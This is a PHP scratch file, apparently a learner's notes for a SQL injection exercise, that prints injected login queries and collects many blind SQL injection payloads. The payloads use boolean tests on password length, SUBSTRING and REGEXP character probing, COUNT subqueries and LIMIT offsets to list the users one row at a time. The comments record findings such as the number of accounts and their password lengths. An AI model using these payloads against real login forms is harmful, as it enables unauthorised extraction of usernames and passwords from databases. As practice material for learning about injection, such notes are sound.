<?php
#SELECT *
#FROM Users
#WHERE Username="
$query = "SELECT * from users where username=\""       .  '" OR (select "a" from users where LENGTH(password) > 0)="a'  .          "\"";
#$mything = '" OR a IN (select "a" as a from users where LENGTH(password) > 0)="a';
#$mything = '" OR password like "%b%" and "a"="a';
$mything = '" OR SUBSTRING(password, 2, 1) REGEXP "[a-z]" -- ';
#$mything = '" OR 1=1 GROUP BY username HAVING CONVERT(COUNT(username),char) ="1';
#$mything = '" OR CONVERT(1, char) ="1';
#$mything = '" OR 10 > (SELECT COUNT(*) FROM users) -- ';
#$mything = '" OR LENGTH(username) <=10 LIMIT 2 -- ';

$mything = '"OR username = (SELECT username FROM users ORDER BY username LIMIT 1) -- ';
echo 'SELECT * FROM Users WHERE username="' . PHP_EOL;
$realquery = $mything ."\"";
echo $realquery;

//LENGTH(password) = 32 =True
//YES 'c','d'


/*
//1111 = falsch, 1104 = richtig
// There is no user with username="" 
//PASSWORD: 6

// There are 4 different accounts: " OR 4 >= (SELECT COUNT(*) FROM users) -- 

" OR SUBSTRING(password, 2, 1) REGEX["a-z"] and "a"="a

" OR password REGEXP "[a-Z]"" and "a"="a

" OR SUBSTRING(password, 2, 1) REGEXP "[a-z]" and "a"="a

CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);



SELECT * FROM users WHERE username ="" OR username = (
    SELECT username FROM users ORDER BY username LIMIT 1
) 



SELECT * FROM users WHERE username ="" OR username = (
    SELECT username FROM users ORDER BY username LIMIT 1, 1
) 




" OR LENGTH(password) <=500 LIMIT 1 -- 

find out username length.
how to only get one record?

username | password
-------------------
???      | ?????????? (10)       " OR LENGTH(password) <=500 LIMIT 1 -- 
?????    | ?????????? (10)       " OR LENGTH(password) <=500 LIMIT 1, 1 -- 
???????  | ?????????? (10)       " OR LENGTH(password) <=500 LIMIT 2, 1 -- 
???????  | ???????????????????????????????? (32)      " OR LENGTH(password) <=500 LIMIT 3, 1 -- 


<div></div>

*/
?>